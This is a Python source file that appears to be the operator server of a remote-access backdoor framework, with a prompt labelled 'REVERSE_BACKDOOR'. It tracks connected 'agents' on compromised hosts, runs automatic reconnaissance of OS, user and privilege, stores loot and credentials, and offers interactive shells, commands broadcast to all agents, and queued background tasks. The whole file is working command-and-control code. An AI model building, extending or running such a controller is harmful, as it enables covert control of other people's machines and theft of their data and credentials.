from server.core.agent_registry import AgentRegistry
from server.core.audit import AuditLogger, LootManager, CredentialStore
from server.core.background import BackgroundManager
from server.commands import build_server_router
from server.commands.base import ServerSessionContext
from server.ui.prompt import print_colored, highlight_output, bold, cyan, green, yellow, red, dim
from server.ui.completer import setup_readline, save_history
from server.ui.shell import AgentShell
from common.logging import get_logger
import os


_audit_logger = None
_loot_manager = None
_credential_store = None


def _init_stores(loot_dir: str):
    global _audit_logger, _loot_manager, _credential_store
    if _audit_logger is None:
        _audit_logger = AuditLogger(loot_dir)
        _loot_manager = LootManager(loot_dir)
        _credential_store = CredentialStore(loot_dir)
    log_dir = os.path.join(loot_dir, 'logs')
    logger = get_logger()
    if logger._per_agent_dir is None:
        logger.set_agent_log_dir(log_dir)
        logger.add_console_handler()
    return _audit_logger, _loot_manager, _credential_store


def _build_protocol(sock, encryption):
    if encryption:
        from server.core.encrypted_protocol import EncryptedProtocol
        proto = EncryptedProtocol(sock)
        proto.perform_key_exchange()
        return proto
    from server.core.protocol import Protocol
    return Protocol(sock)


def _auto_recon(ctx, agent_id, registry, audit):
    try:
        ctx.protocol.send('sysinfo')
        result = str(ctx.protocol.recv())
        info = {}
        for line in result.split('\n'):
            line = line.strip()
            if ':' in line:
                key, val = line.split(':', 1)
                key, val = key.strip().lower(), val.strip()
                if 'operating system' in key:
                    info['os'] = val
                elif 'node name' in key:
                    info['hostname'] = val
                elif 'user' in key:
                    info['user'] = val

        ctx.protocol.send('check_admin')
        info['privilege'] = str(ctx.protocol.recv()).replace('[+] ', '').replace('[-] ', '')

        registry.update_info(agent_id, **info)
        agent_info = registry.get(agent_id)
        if agent_info:
            label = agent_info.label.replace(':', '_').replace('/', '_').replace('\\', '_')
            ctx.agent_label = label
            print_colored(
                f'[*] {agent_id} | {green(label)} | {cyan(info.get("os", "?"))} | {green(info.get("user", "?"))} | {yellow(info.get("privilege", "?"))}',
                'cyan'
            )
        audit.log(agent_id, 'sysinfo (auto-recon)', result[:200])
    except Exception:
        pass


def run_session(sock, ip, loot_dir, encryption=False):
    audit, loot, creds = _init_stores(loot_dir)
    protocol = _build_protocol(sock, encryption)
    registry = AgentRegistry()
    agent_id = registry.register(sock, ip)
    creds.log_session(agent_id, ip, connected=True)

    ctx = None
    router = build_server_router()

    try:
        ctx = ServerSessionContext(
            sock=sock,
            protocol=protocol,
            ip=ip,
            loot_dir=loot_dir,
            agent_id=agent_id,
        )
        _auto_recon(ctx, agent_id, registry, audit)

        commands = list(router._commands.keys())

        shell = AgentShell(router, ctx, agent_id, loot_dir, commands)
        shell.run()

    except (ConnectionError, BrokenPipeError, OSError):
        pass
    finally:
        registry.unregister(agent_id)
        creds.log_session(agent_id, ip, connected=False)
        print_colored(f'[*] {agent_id} ({ip}) disconnected', 'yellow')
        try:
            sock.close()
        except Exception:
            pass


def run_master_loop(loot_dir, encryption=False):
    registry = AgentRegistry()

    from server.ui.completer import build_master_completer
    comp = build_master_completer()
    history_dir = os.path.join(loot_dir, '.history')
    history_file = os.path.join(history_dir, 'master.history')
    setup_readline(comp, history_file)

    print_colored(f'[+] Type {cyan("agents")} to list, {cyan("interact <id>")} to connect, {cyan("queue <id> <cmd>")} to background-task', 'cyan')

    while True:
        try:
            command = input(f'{bold("REVERSE_BACKDOOR")}> ').strip()
        except (EOFError, KeyboardInterrupt):
            print_colored('\n[*] Shutting down...', 'yellow')
            break

        if not command:
            continue

        if command == 'exit' or command == 'quit':
            break

        if command == 'agents':
            agents = registry.list_all()
            if not agents:
                print(dim('  (no agents connected)'))
            else:
                from server.ui.prompt import format_table
                headers = ['ID', 'Host', 'OS', 'User', 'Privilege']
                rows = [[info.agent_id, info.hostname, info.os, info.user, info.privilege] for info in agents.values()]
                print(format_table(headers, rows))
            continue

        if command.startswith('interact '):
            target_id = command[9:].strip()
            info = registry.get(target_id)
            if info is None:
                print_colored(f'[-] Agent {target_id} not found', 'red')
                continue

            bg = BackgroundManager()
            existing_ctx = bg.get_context(target_id)
            if existing_ctx:
                ctx = existing_ctx
                protocol = existing_ctx.protocol
                bg.unbackground(target_id)
                print_colored(f'[+] Resuming {target_id} ({info.ip})', 'green')
            else:
                protocol = _build_protocol(info.sock, encryption)
                print_colored(f'[+] Interacting with {target_id} ({info.ip})', 'green')
                ctx = ServerSessionContext(
                    sock=info.sock,
                    protocol=protocol,
                    ip=info.ip,
                    loot_dir=loot_dir,
                    agent_id=target_id,
                )
            router = build_server_router()
            commands = list(router._commands.keys())
            shell = AgentShell(router, ctx, target_id, loot_dir, commands)
            shell.run()
            continue

        if command.startswith('broadcast '):
            cmd = command[10:].strip()
            registry.broadcast(cmd)
            print_colored(f'[+] Broadcast sent: {cmd}', 'green')
            continue

        if command.startswith('queue '):
            bg = BackgroundManager()
            parts = command[6:].strip().split(None, 1)
            if len(parts) < 2:
                print_colored('[-] Usage: queue <agent-id> <command>', 'red')
                continue
            target_id, cmd = parts
            task_id = bg.queue(target_id, cmd)
            if task_id < 0:
                print_colored(f'[-] Agent {target_id} is not backgrounded. Use interact first, then background.', 'red')
            else:
                print_colored(f'[+] Queued task #{task_id} for {target_id}: {cmd}', 'green')
            continue

        if command == 'tasks':
            bg = BackgroundManager()
            bg_list = bg.list_backgrounded()
            if not bg_list:
                print(dim('  (no backgrounded agents)'))
            else:
                for aid in bg_list:
                    tasks = bg.get_tasks(aid)
                    pending = bg.get_pending_count(aid)
                    print(f'  {cyan(aid)} — {len(tasks)} total, {yellow(pending)} pending')
                    for t in tasks[-5:]:
                        status_color = green if t.status == 'completed' else yellow if t.status == 'pending' else red
                        icon = '+' if t.status == 'completed' else '~' if t.status == 'pending' else 'x'
                        print(f'    {status_color(f"[{icon}]")} #{t.task_id}: {t.command[:60]}')
            continue

        if command.startswith('results '):
            bg = BackgroundManager()
            parts = command[8:].strip().split()
            if len(parts) < 1:
                print_colored('[-] Usage: results <agent-id> [task-id]', 'red')
                continue
            target_id = parts[0]
            if len(parts) >= 2:
                task_id = int(parts[1])
                result = bg.get_result(target_id, task_id)
                if result:
                    print(highlight_output(result))
                else:
                    print_colored(f'[-] Task #{task_id} not found or still pending', 'yellow')
            else:
                tasks = bg.get_tasks(target_id)
                if not tasks:
                    print(dim(f'  (no tasks for {target_id})'))
                else:
                    for t in tasks:
                        print(f'  #{t.task_id} [{t.status}] {t.command[:60]}')
                        if t.status == 'completed' and t.result:
                            print(f'    {highlight_output(str(t.result)[:200])}')
            continue

        if command.startswith('logs'):
            self_l = get_logger()
            args = command[4:].strip()
            if not args:
                summary = self_l.command_summary()
                if not summary:
                    print(dim('  (no commands logged yet)'))
                else:
                    from server.ui.prompt import format_table
                    headers = ['Agent', 'Commands', 'OK', 'Errors', 'Unique']
                    rows = [[aid, str(s['total']), str(s['ok']), str(s['error']), str(s['unique_commands'])]
                            for aid, s in summary.items()]
                    print(format_table(headers, rows))
            else:
                n = 20
                parts = args.split()
                aid = parts[0]
                if len(parts) > 1:
                    try:
                        n = int(parts[1])
                    except ValueError:
                        pass
                entries = self_l.get_recent_commands(aid, n)
                if not entries:
                    print(dim(f'  (no logs for {aid})'))
                else:
                    for e in entries:
                        status_color = green if e.status == 'ok' else red
                        print(f'  {dim(e.timestamp.strftime("%H:%M:%S"))} {status_color(e.status):5} {cyan(e.command[:50]):50} {yellow(f"{e.response_size}b"):>8} {dim(f"{e.duration_ms}ms")}')
            continue

        if command == 'help':
            print(f'''
  {bold('Master Commands:')}
    {cyan('agents')}                  List connected agents (with hostname, OS, user)
    {cyan('interact <id>')}          Enter interactive shell with agent
    {cyan('broadcast <cmd>')}        Send command to all agents
    {cyan('queue <id> <cmd>')}       Queue async command for backgrounded agent
    {cyan('tasks')}                  Show all backgrounded agent tasks
    {cyan('results <id> [task]')}   View task results
    {cyan('logs [agent-id] [n]')}   Show command log summary or per-agent log
    {cyan('help')}                   Show this help
    {cyan('exit / quit')}            Shutdown server

  {bold('Background workflow:')}
    1. interact agent-1
    2. execute some commands
    3. background           → exits shell, agent stays alive
    4. queue agent-1 sysinfo    → fires async, shows task #
    5. tasks                    → see all pending/completed tasks
    6. results agent-1 5       → view task #5 output

  {bold('Logging:')}
    logs                     → summary table per agent
    logs agent-1             → last 20 commands for agent-1
    logs agent-1 50          → last 50 commands for agent-1
''')
            continue

        if command == 'listeners':
            print_colored('[*] Active listener on port...', 'cyan')
            continue

        print_colored(f'[-] Unknown: {command}. Type help.', 'red')

    save_history(history_file)
